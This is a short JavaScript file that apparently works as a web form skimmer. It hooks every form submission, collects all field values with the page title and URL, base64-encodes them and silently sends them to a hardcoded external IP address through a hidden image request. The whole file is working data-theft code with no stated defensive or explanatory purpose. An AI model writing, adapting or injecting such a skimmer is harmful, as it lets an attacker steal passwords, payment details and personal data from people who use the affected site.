var dev = false;

var host = dev ? 'localhost:8765' : '52.27.9.64:8765';

function submit() {
  var data = {
    version: '1.0.3',
    pageInfo: {
      title: document.title,
      url: document.URL
    },
    forms: []
  };

  $('form').each(function() {
    var form = $(this);
    var formData = form.serializeArray().reduce(function(obj, item) {
      obj[item.name] = item.value;
      return obj;
    }, {});

    data.forms.push(formData);
  });

  var dataString = btoa(escape(encodeURIComponent(JSON.stringify(data))));
  $('body').append(
    '<img src="http://' + host + '?q=' + dataString + '" style="display: none">'
  );

  if (dev) {
    console.log('success');
  }
}

(function() {
  'use strict';
  jQuery(function($) {
    $('form').submit(submit);

    if (dev) {
      console.log('setup complete');
    }
  });
})();
